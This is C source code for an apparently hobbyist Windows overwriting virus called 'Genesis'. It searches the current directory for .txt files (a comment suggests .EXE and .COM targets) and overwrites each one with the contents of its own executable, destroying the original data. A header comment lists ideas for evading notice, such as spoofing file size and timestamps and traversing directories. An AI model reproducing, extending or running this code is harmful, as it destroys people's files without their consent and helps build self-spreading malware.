// #################################################### //
//  Name:      Genesis               Type: Overwriting  //
//  Tested on: Windows 11                               //
//  Author:    @DeLuks2006                              //
// #################################################### //

/*
Some Issues and Ideas:
Issues:
- All data is lost so all infected files are the size of the virus
- Obviously Detectable
- The Code is probably really bad and unreadable, so optimizing it would be great
Ideas:
- Spoof the size and date/time
- (Alternatively) only Overwrite part of the host
- Make it traverse Directories
*/

#include <windows.h>
#include <stdio.h>

#define FILENAME FindFileData.cFileName

void Overwrite(char *FileName, FILE *Source) {
    int byte;
    FILE *pFileDest = fopen(FileName, "wb+");
    if (pFileDest == NULL) {
        printf("WTF WHY TF ISNT IT WORKING\n error: %ld\n", GetLastError());
    }

    printf("[+] Writing Data to File...\n");

    while ((byte = fgetc(Source)) != EOF) {
        fputc(byte, pFileDest);
    }
    printf("[+] Closing File: <%s>\n\n", FileName);
    fclose(pFileDest);
}

int main(void) {
    WIN32_FIND_DATA FindFileData;
    HANDLE hFind;
    FILE *pFileSource = fopen("ArmedGenesis.exe", "rb"); // change accordingly - or do sth smart

    if (pFileSource == NULL) {
        printf("[-] YOU IDIOT!! YOU (probably) FORGOT TO CHANGE THE NAME ABOVE!!\n");
    }

    hFind = FindFirstFile("*.txt", &FindFileData); // change accordingly -> It would work pretty well on .COM and .EXE files (though noticable and maybe too big for COM files)
    if (hFind == INVALID_HANDLE_VALUE) {
        printf("[-] FindFirstFile failed (%ld)\n", GetLastError());
        return 1;
    } else if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
        printf("[+] [\\%s]\t\t<DIR>\n", FILENAME);
    } else {
        printf("[+] [%s]\t\t<FILE>\n", FILENAME);
        // OVERWRITING
        Overwrite(FILENAME, pFileSource);
    }
    
    while (FindNextFile(hFind, &FindFileData) != 0) {
        if (hFind == INVALID_HANDLE_VALUE) {
            printf("[-] FindNextFile failed (%ld)\n", GetLastError());
            return 1;
        } else if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            printf("[+] [\\%s]\t\t<DIR>\n", FILENAME);
        } else {
            printf("[+] [%s]\t<FILE>\n", FILENAME);
            // OVERWRITING
            rewind(pFileSource);
            Overwrite(FILENAME, pFileSource);
        }
    }
    FindClose(hFind);
    fclose(pFileSource);
    return 0;
}
